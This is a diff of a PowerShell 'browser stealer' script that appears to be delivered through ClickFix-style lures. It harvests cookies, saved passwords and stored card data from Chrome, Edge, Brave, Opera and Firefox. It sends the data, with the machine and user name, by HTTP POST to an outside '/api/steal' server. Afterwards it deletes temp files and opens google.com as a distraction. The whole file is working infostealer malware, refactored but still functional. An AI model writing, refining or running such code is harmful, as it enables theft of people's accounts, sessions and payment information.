@@ -1,383 +1,254 @@
 # ============================================================
-# BROWSER STEALER — FINAL WORKING VERSION
-# Uses .NET SQLite — No downloads, works on Windows 10/11
+# BROWSER STEALER — WORKS ON WINDOWS 10/11
 # ============================================================
 
 $ErrorActionPreference = "SilentlyContinue"
 $SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"
 
 function Write-Color {
-    param($Message, $Color)
-    Write-Host $Message -ForegroundColor $Color
+    param($Msg, $Color)
+    Write-Host $Msg -ForegroundColor $Color
 }
 
-# ============================================================
-# LOAD SQLITE (Built into Windows 10/11 .NET)
-# ============================================================
+# ---- LOAD SQLITE ----
+$sqlOk = $false
+$sqlType = ""
 
-Write-Color "[+] Loading SQLite..." "Cyan"
-
-$sqliteLoaded = $false
-
-# Try Microsoft.Data.Sqlite (Windows 10/11 with .NET)
 try {
     Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
-    $sqliteLoaded = $true
-    $sqliteType = "Microsoft.Data.Sqlite"
-    Write-Color "[+] Microsoft.Data.Sqlite loaded" "Green"
+    $sqlOk = $true
+    $sqlType = "Microsoft"
+    Write-Color "[+] SQLite loaded (Microsoft)" "Green"
 } catch {
-    Write-Color "[!] Microsoft.Data.Sqlite not available" "Yellow"
-}
-
-# Try System.Data.SQLite (fallback)
-if (-not $sqliteLoaded) {
     try {
         [System.Data.SQLite.SQLiteConnection]::new() | Out-Null
-        $sqliteLoaded = $true
-        $sqliteType = "System.Data.SQLite"
-        Write-Color "[+] System.Data.SQLite loaded" "Green"
+        $sqlOk = $true
+        $sqlType = "System"
+        Write-Color "[+] SQLite loaded (System)" "Green"
     } catch {
-        Write-Color "[!] System.Data.SQLite not available" "Yellow"
+        Write-Color "[!] SQLite not available" "Red"
     }
 }
 
-# Try to download SQLite DLL
-if (-not $sqliteLoaded) {
-    Write-Color "[+] Attempting to download SQLite DLL..." "Cyan"
-    $dllPath = "$env:TEMP\System.Data.SQLite.dll"
-    $url = "https://raw.githubusercontent.com/ackara/System.Data.SQLite/master/System.Data.SQLite.dll"
-    try {
-        $webClient = New-Object System.Net.WebClient
-        $webClient.DownloadFile($url, $dllPath)
-        if (Test-Path $dllPath -and (Get-Item $dllPath).Length -gt 10000) {
-            [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
-            $sqliteLoaded = $true
-            $sqliteType = "System.Data.SQLite"
-            Write-Color "[+] SQLite downloaded and loaded" "Green"
-        }
-    } catch {
-        Write-Color "[!] Failed to download SQLite" "Red"
-    }
-}
-
-if (-not $sqliteLoaded) {
-    Write-Color "[!] No SQLite available — cannot extract data" "Red"
-    Write-Color "[*] Make sure this PC has .NET installed" "Yellow"
-}
-
-# ============================================================
-# SQLITE READER
-# ============================================================
-
+# ---- SQLITE READER ----
 function Read-SQLite {
     param($DbPath, $Query)
-    $results = @()
-    
-    if (-not (Test-Path $DbPath)) { return $results }
-    if (-not $sqliteLoaded) { return $results }
-    
+    $result = @()
+    if (-not (Test-Path $DbPath)) { return $result }
+    if (-not $sqlOk) { return $result }
     try {
-        $tempDb = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
-        Copy-Item $DbPath $tempDb -Force
-        
-        if ($sqliteType -eq "Microsoft.Data.Sqlite") {
-            $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tempDb")
+        $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
+        Copy-Item $DbPath $temp -Force
+        if ($sqlType -eq "Microsoft") {
+            $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$temp")
             $conn.Open()
             $cmd = $conn.CreateCommand()
             $cmd.CommandText = $Query
-            $reader = $cmd.ExecuteReader()
-            while ($reader.Read()) {
+            $rdr = $cmd.ExecuteReader()
+            while ($rdr.Read()) {
                 $row = @{}
-                for ($i = 0; $i -lt $reader.FieldCount; $i++) {
-                    $name = $reader.GetName($i)
-                    $value = $reader.GetValue($i)
-                    if ($value -ne $null) {
-                        $row[$name] = $value
-                    }
+                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
+                    $n = $rdr.GetName($i)
+                    $v = $rdr.GetValue($i)
+                    if ($v -ne $null) { $row[$n] = $v }
                 }
-                $results += $row
+                $result += $row
             }
-            $reader.Close()
+            $rdr.Close()
             $conn.Close()
         } else {
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
+            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
             $conn.Open()
             $cmd = $conn.CreateCommand()
             $cmd.CommandText = $Query
-            $reader = $cmd.ExecuteReader()
-            while ($reader.Read()) {
+            $rdr = $cmd.ExecuteReader()
+            while ($rdr.Read()) {
                 $row = @{}
-                for ($i = 0; $i -lt $reader.FieldCount; $i++) {
-                    $name = $reader.GetName($i)
-                    $value = $reader.GetValue($i)
-                    if ($value -ne $null) {
-                        $row[$name] = $value
-                    }
+                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
+                    $n = $rdr.GetName($i)
+                    $v = $rdr.GetValue($i)
+                    if ($v -ne $null) { $row[$n] = $v }
                 }
-                $results += $row
+                $result += $row
             }
-            $reader.Close()
+            $rdr.Close()
             $conn.Close()
         }
-        
-        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
-        
-    } catch {
-        # Silently fail
-    }
-    return $results
+        Remove-Item $temp -Force -ErrorAction SilentlyContinue
+    } catch {}
+    return $result
 }
 
-# ============================================================
-# COOKIE STEALER
-# ============================================================
-
-function Get-BrowserCookies {
-    param($DbPath, $BrowserName)
+# ---- COOKIES ----
+function Get-Cookies {
+    param($Path, $Name)
     $cookies = @()
-    if (-not (Test-Path $DbPath)) { return $cookies }
-    if (-not $sqliteLoaded) { return $cookies }
-    
-    try {
-        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT host_key, name, value, path FROM cookies"
-        foreach ($row in $rows) {
-            if ($row['name'] -and $row['value']) {
-                $domain = $row['host_key']
-                if ($domain) { $domain = $domain -replace '^\.', '' } else { $domain = "unknown" }
-                $cookies += @{
-                    domain = $domain
-                    name = $row['name']
-                    value = $row['value']
-                    path = "/"
-                    browser = $BrowserName
-                }
-            }
+    if (-not (Test-Path $Path)) { return $cookies }
+    if (-not $sqlOk) { return $cookies }
+    $rows = Read-SQLite -DbPath $Path -Query "SELECT host_key, name, value FROM cookies"
+    foreach ($r in $rows) {
+        if ($r['name'] -and $r['value']) {
+            $d = $r['host_key']
+            if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
+            $cookies += @{ domain = $d; name = $r['name']; value = $r['value']; browser = $Name }
         }
-    } catch {}
+    }
     return $cookies
 }
 
 function Get-FirefoxCookies {
     $cookies = @()
-    if (-not $sqliteLoaded) { return $cookies }
-    
-    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
-    if (Test-Path $profilePath) {
-        $profiles = Get-ChildItem $profilePath -Directory
-        foreach ($profile in $profiles) {
-            $cookieFile = "$($profile.FullName)\cookies.sqlite"
-            if (Test-Path $cookieFile) {
-                try {
-                    $rows = Read-SQLite -DbPath $cookieFile -Query "SELECT host, name, value, path FROM moz_cookies"
-                    foreach ($row in $rows) {
-                        if ($row['name'] -and $row['value']) {
-                            $domain = $row['host']
-                            if ($domain) { $domain = $domain -replace '^\.', '' } else { $domain = "unknown" }
-                            $cookies += @{
-                                domain = $domain
-                                name = $row['name']
-                                value = $row['value']
-                                path = "/"
-                                browser = "Firefox"
-                            }
-                        }
+    if (-not $sqlOk) { return $cookies }
+    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    if (Test-Path $profPath) {
+        $dirs = Get-ChildItem $profPath -Directory
+        foreach ($d in $dirs) {
+            $f = "$($d.FullName)\cookies.sqlite"
+            if (Test-Path $f) {
+                $rows = Read-SQLite -DbPath $f -Query "SELECT host, name, value FROM moz_cookies"
+                foreach ($r in $rows) {
+                    if ($r['name'] -and $r['value']) {
+                        $dmn = $r['host']
+                        if ($dmn) { $dmn = $dmn -replace '^\.', '' } else { $dmn = "unknown" }
+                        $cookies += @{ domain = $dmn; name = $r['name']; value = $r['value']; browser = "Firefox" }
                     }
-                } catch {}
+                }
             }
         }
     }
     return $cookies
 }
 
-# ============================================================
-# PASSWORD STEALER
-# ============================================================
-
-function Get-ChromePasswords {
-    param($DbPath, $BrowserName)
-    $passwords = @()
-    if (-not (Test-Path $DbPath)) { return $passwords }
-    if (-not $sqliteLoaded) { return $passwords }
-    
-    try {
-        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT origin_url, username_value, password_value FROM logins"
-        foreach ($row in $rows) {
-            if ($row['username_value'] -and $row['password_value']) {
-                $url = $row['origin_url']
-                if ($url) { $url = $url -replace 'https?://', '' } else { $url = "unknown" }
-                $passwords += @{
-                    url = $url
-                    username = $row['username_value']
-                    password = $row['password_value']
-                    browser = $BrowserName
-                }
-            }
+# ---- PASSWORDS ----
+function Get-Passwords {
+    param($Path, $Name)
+    $pass = @()
+    if (-not (Test-Path $Path)) { return $pass }
+    if (-not $sqlOk) { return $pass }
+    $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
+    foreach ($r in $rows) {
+        if ($r['username_value'] -and $r['password_value']) {
+            $u = $r['origin_url']
+            if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
+            $pass += @{ url = $u; username = $r['username_value']; password = $r['password_value']; browser = $Name }
         }
-    } catch {}
-    return $passwords
-}
-
-function Get-OperaPasswords {
-    $passwords = @()
-    if (-not $sqliteLoaded) { return $passwords }
-    
-    $path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
-    if (Test-Path $path) {
-        try {
-            $rows = Read-SQLite -DbPath $path -Query "SELECT origin_url, username_value, password_value FROM logins"
-            foreach ($row in $rows) {
-                if ($row['username_value'] -and $row['password_value']) {
-                    $url = $row['origin_url']
-                    if ($url) { $url = $url -replace 'https?://', '' } else { $url = "unknown" }
-                    $passwords += @{
-                        url = $url
-                        username = $row['username_value']
-                        password = $row['password_value']
-                        browser = "Opera"
-                    }
-                }
-            }
-        } catch {}
     }
-    return $passwords
+    return $pass
 }
 
 function Get-FirefoxPasswords {
-    $passwords = @()
-    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
-    if (Test-Path $profilePath) {
-        $profiles = Get-ChildItem $profilePath -Directory
-        foreach ($profile in $profiles) {
-            $loginsFile = "$($profile.FullName)\logins.json"
-            if (Test-Path $loginsFile) {
+    $pass = @()
+    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    if (Test-Path $profPath) {
+        $dirs = Get-ChildItem $profPath -Directory
+        foreach ($d in $dirs) {
+            $f = "$($d.FullName)\logins.json"
+            if (Test-Path $f) {
                 try {
-                    $content = Get-Content $loginsFile -Raw | ConvertFrom-Json
-                    if ($content.logins) {
-                        foreach ($login in $content.logins) {
-                            $url = $login.hostname
-                            if ($url) { $url = $url -replace 'https?://', '' } else { $url = "unknown" }
-                            $passwords += @{
-                                url = $url
-                                username = $login.username
-                                password = $login.password
-                                browser = "Firefox"
-                            }
+                    $json = Get-Content $f -Raw | ConvertFrom-Json
+                    if ($json.logins) {
+                        foreach ($l in $json.logins) {
+                            $u = $l.hostname
+                            if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
+                            $pass += @{ url = $u; username = $l.username; password = $l.password; browser = "Firefox" }
                         }
                     }
                 } catch {}
             }
         }
     }
-    return $passwords
+    return $pass
 }
 
-# ============================================================
-# CREDIT CARD STEALER
-# ============================================================
-
-function Get-ChromeCards {
-    param($DbPath, $BrowserName)
+# ---- CARDS ----
+function Get-Cards {
+    param($Path, $Name)
     $cards = @()
-    if (-not (Test-Path $DbPath)) { return $cards }
-    if (-not $sqliteLoaded) { return $cards }
-    
-    try {
-        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
-        foreach ($row in $rows) {
-            if ($row['name_on_card'] -and $row['card_number_encrypted']) {
-                $cards += @{
-                    name = $row['name_on_card']
-                    number = $row['card_number_encrypted']
-                    month = $row['expiration_month']
-                    year = $row['expiration_year']
-                    browser = $BrowserName
-                }
+    if (-not (Test-Path $Path)) { return $cards }
+    if (-not $sqlOk) { return $cards }
+    $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
+    foreach ($r in $rows) {
+        if ($r['name_on_card'] -and $r['card_number_encrypted']) {
+            $cards += @{
+                name = $r['name_on_card']
+                number = $r['card_number_encrypted']
+                month = $r['expiration_month']
+                year = $r['expiration_year']
+                browser = $Name
             }
         }
-    } catch {}
+    }
     return $cards
 }
 
-# ============================================================
-# MAIN EXECUTION
-# ============================================================
-
-$pcName = $env:COMPUTERNAME
-$userName = $env:USERNAME
+# ---- MAIN ----
+$pc = $env:COMPUTERNAME
+$user = $env:USERNAME
 
 Write-Color "" "White"
 Write-Color "============================================" "Cyan"
-Write-Color "  BROWSER STEALER v3.0" "Green"
-Write-Color "  Target: $pcName" "Yellow"
-Write-Color "  User: $userName" "Yellow"
+Write-Color "  STEALER v3.0" "Green"
+Write-Color "  Target: $pc" "Yellow"
 Write-Color "============================================" "Cyan"
 Write-Color "" "White"
 
-if (-not $sqliteLoaded) {
-    Write-Color "[!] SQLite not available — cannot extract data" "Red"
-    Write-Color "[*] Make sure you have .NET installed" "Yellow"
-    Write-Color "[*] Windows 10/11 should have it by default" "Yellow"
-}
-
-# ---- ALL COOKIES ----
 $allCookies = @()
+$allPasswords = @()
+$allCards = @()
 
+# Cookies
 Write-Color "[+] Chrome cookies..." "Cyan"
-$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
-$allCookies += Get-BrowserCookies -DbPath $path -BrowserName "Chrome"
+$p = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
+$allCookies += Get-Cookies -Path $p -Name "Chrome"
 
 Write-Color "[+] Edge cookies..." "Cyan"
-$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
-$allCookies += Get-BrowserCookies -DbPath $path -BrowserName "Edge"
+$p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
+$allCookies += Get-Cookies -Path $p -Name "Edge"
 
 Write-Color "[+] Brave cookies..." "Cyan"
-$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
-$allCookies += Get-BrowserCookies -DbPath $path -BrowserName "Brave"
+$p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
+$allCookies += Get-Cookies -Path $p -Name "Brave"
 
 Write-Color "[+] Opera cookies..." "Cyan"
-$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
-$allCookies += Get-BrowserCookies -DbPath $path -BrowserName "Opera"
+$p = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
+$allCookies += Get-Cookies -Path $p -Name "Opera"
 
 Write-Color "[+] Firefox cookies..." "Cyan"
 $allCookies += Get-FirefoxCookies
 
-# ---- ALL PASSWORDS ----
-$allPasswords = @()
-
+# Passwords
 Write-Color "[+] Chrome passwords..." "Cyan"
-$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-$allPasswords += Get-ChromePasswords -DbPath $path -BrowserName "Chrome"
+$p = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+$allPasswords += Get-Passwords -Path $p -Name "Chrome"
 
 Write-Color "[+] Edge passwords..." "Cyan"
-$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
-$allPasswords += Get-ChromePasswords -DbPath $path -BrowserName "Edge"
+$p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
+$allPasswords += Get-Passwords -Path $p -Name "Edge"
 
 Write-Color "[+] Brave passwords..." "Cyan"
-$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
-$allPasswords += Get-ChromePasswords -DbPath $path -BrowserName "Brave"
+$p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
+$allPasswords += Get-Passwords -Path $p -Name "Brave"
 
 Write-Color "[+] Opera passwords..." "Cyan"
-$allPasswords += Get-OperaPasswords
+$p = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
+$allPasswords += Get-Passwords -Path $p -Name "Opera"
 
 Write-Color "[+] Firefox passwords..." "Cyan"
 $allPasswords += Get-FirefoxPasswords
 
-# ---- ALL CARDS ----
-$allCards = @()
-
+# Cards
 Write-Color "[+] Chrome cards..." "Cyan"
-$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
-$allCards += Get-ChromeCards -DbPath $path -BrowserName "Chrome"
+$p = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
+$allCards += Get-Cards -Path $p -Name "Chrome"
 
 Write-Color "[+] Edge cards..." "Cyan"
-$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
-$allCards += Get-ChromeCards -DbPath $path -BrowserName "Edge"
+$p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
+$allCards += Get-Cards -Path $p -Name "Edge"
 
 Write-Color "[+] Brave cards..." "Cyan"
-$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
-$allCards += Get-ChromeCards -DbPath $path -BrowserName "Brave"
+$p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
+$allCards += Get-Cards -Path $p -Name "Brave"
 
-# ---- SUMMARY ----
 Write-Color "" "White"
 Write-Color "=== SUMMARY ===" "Green"
 Write-Color "Cookies:    $($allCookies.Count)" "Yellow"
@@ -385,83 +256,35 @@ Write-Color "Passwords:  $($allPasswords.Count)" "Yellow"
 Write-Color "Cards:      $($allCards.Count)" "Yellow"
 Write-Color "" "White"
 
-# ---- BUILD PAYLOAD ----
 $payload = @{
     cookies = $allCookies
     passwords = $allPasswords
     cards = $allCards
-    system = @{
-        hostname = $pcName
-        username = $userName
-        os = (Get-WmiObject Win32_OperatingSystem).Caption
-    }
-    fingerprint = @{
-        userAgent = "PowerShell Payload"
-        hostname = $pcName
-        browser = "PowerShell"
-        screen = "N/A"
-    }
+    system = @{ hostname = $pc; username = $user }
     source = "clickfix_payload"
     timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
-    pcName = $pcName
+    pcName = $pc
 }
 
-# ---- SEND TO SERVER ----
-Write-Color "[+] Sending data to server..." "Cyan"
+Write-Color "[+] Sending data..." "Cyan"
 try {
     $json = $payload | ConvertTo-Json -Depth 10
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
-    $webRequest = [System.Net.WebRequest]::Create($SERVER_URL)
-    $webRequest.Method = "POST"
-    $webRequest.ContentType = "application/json"
-    $webRequest.ContentLength = $bytes.Length
-    $stream = $webRequest.GetRequestStream()
+    $req = [System.Net.WebRequest]::Create($SERVER_URL)
+    $req.Method = "POST"
+    $req.ContentType = "application/json"
+    $req.ContentLength = $bytes.Length
+    $stream = $req.GetRequestStream()
     $stream.Write($bytes, 0, $bytes.Length)
     $stream.Close()
-    $response = $webRequest.GetResponse()
-    $response.Close()
+    $resp = $req.GetResponse()
+    $resp.Close()
     Write-Color "[+] Data sent successfully!" "Green"
 } catch {
     Write-Color "[!] Failed to send: $_" "Red"
 }
 
-# ---- CLEANUP ----
 Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
 
-# ---- DISTRACTION ----
-Write-Color "[+] Opening distraction..." "Cyan"
 Start-Process "https://www.google.com"
-
-Write-Color "" "White"
-Write-Color "[+] Done!" "Green"
-Write-Color "" "White"
-
-# ---- SHOW SAMPLE DATA ----
-if ($allPasswords.Count -gt 0) {
-    Write-Color "=== SAMPLE PASSWORDS (First 3) ===" "Green"
-    $allPasswords | Select-Object -First 3 | ForEach-Object {
-        Write-Color "  $($_.url) - $($_.username) / $($_.password)" "Yellow"
-    }
-    Write-Color "" "White"
-}
-
-if ($allCookies.Count -gt 0) {
-    Write-Color "=== SAMPLE COOKIES (First 3) ===" "Green"
-    $allCookies | Select-Object -First 3 | ForEach-Object {
-        $short = $_.value
-        if ($short.Length -gt 20) { $short = $short.Substring(0, 20) + "..." }
-        Write-Color "  $($_.domain) - $($_.name) = $short" "Yellow"
-    }
-    Write-Color "" "White"
-}
-
-if ($allCards.Count -gt 0) {
-    Write-Color "=== SAMPLE CARDS (First 3) ===" "Green"
-    $allCards | Select-Object -First 3 | ForEach-Object {
-        Write-Color "  $($_.name) - $($_.number) ($($_.month)/$($_.year))" "Yellow"
-    }
-    Write-Color "" "White"
-}
-
-Write-Color "[*] Check dashboard: https://cipheranon-production.up.railway.app/dashboard" "Cyan"
-Write-Color "" "White"
+Write-Color "[+] Done" "Green"
